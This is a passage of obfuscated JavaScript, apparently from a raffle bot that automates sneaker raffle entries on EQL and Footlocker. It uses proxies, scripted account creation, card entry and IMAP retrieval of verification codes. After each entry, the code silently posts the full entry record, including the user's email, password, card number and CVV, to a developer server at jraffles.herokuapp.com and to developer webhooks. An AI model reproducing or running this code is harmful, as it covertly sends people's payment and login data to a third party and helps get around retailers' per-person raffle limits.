                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a464f = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x277da8 = await _0x3a464f['newPage']();
                            await _0x277da8['authenticate']({
                                'username': '' + _0x1b0a26[0x2],
                                'password': '' + _0x1b0a26[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x277da8['setRequestInterception'](!![]), _0x277da8['on']('request', _0x524073 => {
                                _0x524073['resourceType']() === 'image' || _0x524073['resourceType']() === 'font' || _0x524073['resourceType']() === 'media' ? _0x524073['abort']() : _0x524073['continue']();
                            });
                            try {
                                await _0x277da8['goto']('' + _0x521081);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x116d4a(0x3e8), await _0x277da8['waitForSelector']('#email'), await _0x277da8['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x116d4a(0x3e8);
                            try {
                                _0x33eb99[_0x3ae296]['Url']['includes']('en-GB') ? await _0x277da8['click']('li[data-value=\x22UK\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x20/\x20US\x20' + (Number(_0x33eb99[_0x3ae296]['Size']) + 0x1) + '\x22]') : await _0x277da8['click']('li[data-value=\x22EU\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x33eb99[_0x3ae296]['Size']);
                            }
                            await _0x116d4a(0x6a4), await _0x277da8['type']('#email', '' + _0x33eb99[_0x3ae296]['Email']), await _0x116d4a(0x352), await _0x277da8['waitForSelector']('#password'), await _0x277da8['type']('#password', '' + _0x33eb99[_0x3ae296]['Password']), await _0x116d4a(0x352), await _0x277da8['type']('#phone', '' + _0x33eb99[_0x3ae296]['Phone']), await _0x116d4a(0x352);
                            const _0x583950 = await _0x277da8['$']('#title\x20>\x20label');
                            await _0x116d4a(0x12c);
                            _0x583950 && await _0x583950['click']();
                            await _0x277da8['type']('#firstName', '' + _0x33eb99[_0x3ae296]['FirstName']), await _0x116d4a(0x352), await _0x277da8['type']('#lastName', '' + _0x33eb99[_0x3ae296]['LastName']), await _0x116d4a(0x352);
                            _0x33eb99[_0x3ae296]['Url']['includes']('footlocker.de') ? await _0x277da8['type']('#birthdate', _0x1053b1(0xa, 0x1c) + '.' + _0x1053b1(0xa, 0xc) + '.' + _0x1053b1(0x7c6, 0x7d3)) : await _0x277da8['type']('#birthdate', _0x1053b1(0xa, 0x1c) + '-' + _0x1053b1(0xa, 0xc) + '-' + _0x1053b1(0x7c6, 0x7d3));
                            await _0x116d4a(0x352), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x33eb99[_0x3ae296]['Url']['includes']('en-GB') && await _0x277da8['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x116d4a(0x1f4), await _0x116d4a(0x5dc);
                            if (!_0x521081['includes']('footlocker'))
                                try {
                                    await _0x277da8['click']('#country');
                                    const _0x130828 = await _0x277da8['$']('li[data-value=\x22' + _0x33eb99[_0x3ae296]['Country'] + '\x22]');
                                    await _0x130828['click'](), await _0x130828['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x116d4a(0x3e8);
                            if (!_0x33eb99[_0x3ae296]['Url']['includes']('en-GB')) {
                                await _0x277da8['click']('#stateAutocomplete'), await _0x116d4a(0x1f4);
                                try {
                                    const _0x588924 = await _0x277da8['$x']('//li[text()=\x22' + _0x33eb99[_0x3ae296]['State'] + '\x22]');
                                    await _0x588924[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x116d4a(0x3e8), await _0x116d4a(0x1f4), await _0x277da8['type']('#address1', _0x33eb99[_0x3ae296]['Address1'] + '\x20' + _0x33eb99[_0x3ae296]['HouseNumber']), await _0x116d4a(0x1f4), await _0x277da8['type']('#address2', '' + _0x33eb99[_0x3ae296]['Address2']), await _0x116d4a(0x1f4), await _0x277da8['type']('#city', '' + _0x33eb99[_0x3ae296]['City']), await _0x116d4a(0x1f4), await _0x277da8['type']('#postcode', '' + _0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x3e8), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x3e8), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x387966 = await _0x277da8['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x387966 && (await _0x277da8['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x4b0), await _0x277da8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x1f4), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0x116d4a(0x320), await _0x277da8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0x116d4a(0x4b0), await _0x277da8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']), await _0x116d4a(0x226), await _0x277da8['type']('input[name=\x22postalCode\x22]', '' + _0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x226));
                            const _0x3e5a23 = await _0x277da8['$']('.__PrivateStripeElement');
                            _0x3e5a23 && (await _0x116d4a(0x1f4), await _0x277da8['click']('.__PrivateStripeElement'), await _0x277da8['click']('.__PrivateStripeElement'), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']));
                            await _0x116d4a(0x226), await _0x277da8['click']('#paymentConsent'), await _0x116d4a(0x226), await _0x277da8['click']('#termsConsent'), await _0x116d4a(0x2bc), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x2710);
                            try {
                                await _0x277da8['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x116d4a(0xbb8), await _0x277da8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xa78480 => _0xa78480['click']()), await _0x277da8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x3f90b2 => _0x3f90b2['click']());
                            } catch {
                            }
                            try {
                                await _0x277da8['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x238ee1 = await _0x277da8['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x238ee1) {
                                    _0x65e0bc['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x33eb99[_0x3ae296]['Email'] + ',' + _0x33eb99[_0x3ae296]['Password'] + ',' + _0x33eb99[_0x3ae296]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x3fb0ed() {
                                var _0x4ecc63, _0x368628 = ![];
                                for (var _0x1554b4 = 0x0; _0x1554b4 < 0x18; _0x1554b4++) {
                                    async function _0x2ed6e7() {
                                        var _0x25ca3a = new _0x3e4e8d({
                                            'user': _0x51d52a['masterMail'],
                                            'password': _0x51d52a['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3ce15b(_0xe1f452) {
                                            _0x25ca3a['openBox']('INBOX', ![], _0xe1f452);
                                        }
                                        _0x25ca3a['once']('ready', function () {
                                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3ce15b(function (_0x4dba9a, _0x43dc33) {
                                                console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4dba9a)
                                                    throw _0x4dba9a;
                                                _0x25ca3a['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x472c5e, _0x4f827a) {
                                                    if (!_0x4f827a || !_0x4f827a['length'])
                                                        console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x25ca3a['end']();
                                                    else {
                                                        var _0x547581 = _0x25ca3a['seq']['fetch'](_0x4f827a, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x547581['on']('message', function (_0x1a99de, _0x7630f1) {
                                                            var _0x4e7719 = '(#' + _0x7630f1 + ')\x20';
                                                            _0x1a99de['on']('body', function (_0x28105b, _0x4fbdba) {
                                                                _0x300bc8(_0x28105b, (_0x14f570, _0x1369a4) => {
                                                                    if (_0x1369a4['subject']['includes']('code')) {
                                                                        const _0x41511c = _0x1369a4['text']['split']('\x0a\x0a')[0x3], _0x59b78e = _0x41511c['split']('\x0a')[0x1];
                                                                        _0x4ecc63 = _0x59b78e;
                                                                    }
                                                                });
                                                            }), _0x1a99de['once']('end', function () {
                                                            });
                                                        }), _0x547581['once']('error', function (_0x4aac69) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x547581['once']('end', function () {
                                                            _0x25ca3a['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x25ca3a['once']('error', function (_0x46858a) {
                                            console['log'](_0x1403a4['red'](_0x46858a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x368628 = !![];
                                        }), _0x25ca3a['once']('end', async function () {
                                        }), _0x25ca3a['connect']();
                                    }
                                    _0x2ed6e7(), await _0x116d4a(0x1388);
                                    if (_0x4ecc63)
                                        return _0x4ecc63;
                                    if (_0x368628)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1554b4 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3fb0ed(), await _0x116d4a(0x1f4), await _0x277da8['type']('#code', '' + code), await _0x116d4a(0x3e8), await _0x277da8['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x4bfa74 => _0x4bfa74['click']()), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x277da8['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x33eb99[_0x3ae296]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x65e0bc['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x33eb99[_0x3ae296]['Email'] + ',' + _0x33eb99[_0x3ae296]['Password'] + ',' + _0x33eb99[_0x3ae296]['Phone']), _0x18c823 = 'no', _0x523ce4(_0x33eb99[_0x3ae296], _0x463ad4);
                            var _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
                            let _0x315000 = _0x33eb99[_0x3ae296];
                            try {
                                prxdata = {
                                    'username': _0x358285['replace']('#', ''),
                                    'module': _0x463ad4['name'],
                                    'entrydata': JSON['stringify'](_0x315000),
                                    'proxy': '' + _0x7213f8[_0x3ae296]
                                };
                                var _0x2e4a43 = JSON['stringify'](prxdata);
                                let _0x380c8a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x2e4a43, _0x380c8a);
                            } catch (_0x4262ce) {
                            }
                            const _0x57a9c7 = {
                                'succesDEVMSG': { 'embeds': [_0x124193] },
                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
                            };
                            try {
                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x57a9c7['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x57a9c7['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x57a9c7['succesPUBMSG']);
                            } catch (_0x2f0ec5) {
                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2f0ec5));
                            }
                        } catch (_0xef109e) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20' + _0xef109e)), _0x9ba48a = '' + _0xef109e;
                            var _0x2cb793 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', !![], _0x9ba48a), _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
                            const _0x2b9515 = {
                                'succesDEVMSG': { 'embeds': [_0x124193] },
                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
                            };
                            _0x2b9515['errorDEV'] = { 'embeds': [_0x2cb793] };
                            _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x2b9515['errorDEV']);
                            await _0x3c7bbe(_0x802c1e, _0x2b9515['errorDEV']);
                            if (!_0x18c823 == 'no')
                                _0x18c823 = 'yes';
                        } finally {
                            _0x3a464f && _0x3a464f['close']();
                            if (_0x18c823 == 'yes' && _0x133942 != 0x5) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Retrying\x20(' + _0x133942 + '\x20/\x205)')), _0x3ae296 = _0x3ae296 - 0x1, _0x133942 = _0x133942 + 0x1;
                                continue;
                            }
                            _0x18c823 == 'yes' && _0x133942 >= 0x5 && (_0x5925c7(_0x33eb99[_0x3ae296], _0x463ad4), _0x18c823 = 'no', _0x133942 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    } else {
                        const _0x3a475e = '' + _0x33eb99[_0x3ae296]['Url'];
                        if (_0x18c823 != 'yes')
                            var _0x18c823 = '', _0x133942 = 0x0;
                        if (_0x33eb99[_0x3ae296]['Email'] == '' || _0x33eb99[_0x3ae296]['FirstName'] == '' || _0x33eb99[_0x3ae296]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x33eb99[_0x3ae296]['Password'] == '' && (_0x33eb99[_0x3ae296]['Password'] = 'JRaffles23!');
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x1b0a26 = _0x7213f8[_0x3ae296]['split'](':');
                        else
                            var _0x495766 = Math['round'](Math['random']() * (_0x7213f8['length'] - 0x1)), _0x1b0a26 = _0x7213f8[_0x495766]['split'](':');
                        var _0x3a464f;
                        try {
                            _0x3a464f = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a464f = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xad01ac = await _0x3a464f['newPage']();
                            await _0xad01ac['authenticate']({
                                'username': '' + _0x1b0a26[0x2],
                                'password': '' + _0x1b0a26[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xad01ac['setRequestInterception'](!![]), _0xad01ac['on']('request', _0x37b58a => {
                                _0x37b58a['resourceType']() === 'image' || _0x37b58a['resourceType']() === 'font' || _0x37b58a['resourceType']() === 'media' ? _0x37b58a['abort']() : _0x37b58a['continue']();
                            }), await _0xad01ac['goto'](_0x3a475e), await _0xad01ac['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xad01ac['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x116d4a(0x7d0), await _0xad01ac['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xad01ac['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x116d4a(0x3e8), await _0xad01ac['waitForSelector']('#email'), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xad01ac['type']('#email', '' + _0x33eb99[_0x3ae296]['Email']), await _0x116d4a(0x352), await _0xad01ac['waitForSelector']('#password'), await _0xad01ac['type']('#password', '' + _0x33eb99[_0x3ae296]['Password']), await _0x116d4a(0x352), await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x1388);
                            if (!_0x33eb99[_0x3ae296]['Url']['includes']('footlocker'))
                                await _0xad01ac['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0xad01ac['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x523ce4(_0x33eb99[_0x3ae296], _0x463ad4), _0x18c823 = 'no';
                                continue;
                            }
                            await _0xad01ac['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x116d4a(0x3e8);
                            try {
                                _0x33eb99[_0x3ae296]['Url']['includes']('en-GB') ? await _0xad01ac['click']('li[data-value=\x22UK\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x20/\x20US\x20' + (Number(_0x33eb99[_0x3ae296]['Size']) + 0x1) + '\x22]') : await _0xad01ac['click']('li[data-value=\x22EU\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x33eb99[_0x3ae296]['Size']);
                            }
                            await _0x116d4a(0x1f4);
                            const _0x599dff = await _0xad01ac['$']('#title\x20>\x20label');
                            await _0x116d4a(0x12c);
                            _0x599dff && await _0x599dff['click']();
                            await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xad01ac['focus']('#postcode'), await _0xad01ac['keyboard']['down']('Control'), await _0xad01ac['keyboard']['press']('A'), await _0xad01ac['keyboard']['up']('Control'), await _0xad01ac['keyboard']['press']('Backspace'), await _0xad01ac['keyboard']['type'](_0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x60e), await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x3e8), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x116d4a(0x1f4);
                            const _0x3b2fcb = await _0xad01ac['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x3b2fcb && (await _0xad01ac['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xad01ac['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xad01ac['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x4b0), await _0xad01ac['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x1f4), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0x116d4a(0x320), await _0xad01ac['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0x116d4a(0x4b0), await _0xad01ac['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']), await _0x116d4a(0x226), await _0xad01ac['type']('input[name=\x22postalCode\x22]', '' + _0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x226));
                            const _0x1d02b5 = await _0xad01ac['$']('.__PrivateStripeElement');
                            _0x1d02b5 && (await _0xad01ac['click']('#billingName'), await _0xad01ac['click']('#billingName'), await _0xad01ac['type']('#billingName', '' + _0x33eb99[_0x3ae296]['NameOnCard']), await _0x116d4a(0x1f4), await _0xad01ac['click']('.__PrivateStripeElement'), await _0xad01ac['click']('.__PrivateStripeElement'), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']));
                            await _0x116d4a(0x226), await _0xad01ac['click']('#paymentConsent'), await _0x116d4a(0x226), await _0xad01ac['click']('#termsConsent'), await _0x116d4a(0x2bc), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x2710);
                            try {
                                await _0xad01ac['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x116d4a(0xbb8), await _0xad01ac['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x37dc67 => _0x37dc67['click']()), await _0xad01ac['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x28667c => _0x28667c['click']());
                            } catch {
                            }
                            try {
                                await _0xad01ac['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x523ce4(_0x33eb99[_0x3ae296], _0x463ad4);
                            var _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
                            let _0x5b9f90 = _0x33eb99[_0x3ae296];
                            try {
                                prxdata = {
                                    'username': _0x358285['replace']('#', ''),
                                    'module': _0x463ad4['name'],
                                    'entrydata': JSON['stringify'](_0x5b9f90),
                                    'proxy': '' + _0x7213f8[_0x3ae296]
                                };
                                var _0x2e4a43 = JSON['stringify'](prxdata);
                                let _0x4c3fdb = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x2e4a43, _0x4c3fdb);
                            } catch (_0xe66fd1) {
                            }
                            const _0x59fb88 = {
                                'succesDEVMSG': { 'embeds': [_0x124193] },
                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
                            };
                            try {
                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x59fb88['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x59fb88['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x59fb88['succesPUBMSG']);
                            } catch (_0x19a3d1) {
                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x19a3d1));
                            }
                            _0x18c823 = 'no';
                        } catch (_0xd14b98) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20' + _0xd14b98)), _0x9ba48a = '' + _0xd14b98;
                            var _0x2cb793 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', !![], _0x9ba48a), _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
                            const _0x9c0cba = {
                                'succesDEVMSG': { 'embeds': [_0x124193] },
                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
                            };
                            _0x9c0cba['errorDEV'] = { 'embeds': [_0x2cb793] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x9c0cba['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x9c0cba['errorDEV']), _0x18c823 = 'yes';
                        } finally {
                            _0x3a464f && _0x3a464f['close']();
                            if (_0x18c823 == 'yes' && _0x133942 != 0x5) {
